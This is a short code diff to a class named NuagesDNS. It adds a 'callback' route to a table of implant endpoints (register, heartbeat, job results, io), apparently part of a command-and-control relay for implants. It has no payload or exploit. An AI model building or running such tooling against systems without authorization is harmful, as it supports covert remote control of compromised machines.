@@ -91,7 +91,7 @@ class NuagesDNS:
         self.connectionString = connectionString
         self.domain = domain
         self.domNum = domain.count(".") + 1
-        self.urls={"i":"/implant/io", "r":"/implant/register", "j":"/implant/jobresult", "h":"/implant/heartbeat"}
+        self.urls={"i":"/implant/io", "r":"/implant/register", "j":"/implant/jobresult", "h":"/implant/heartbeat", "c":"/implant/callback"}
 
     def POST(self, url, body):
         if not(args.quiet): print(url)
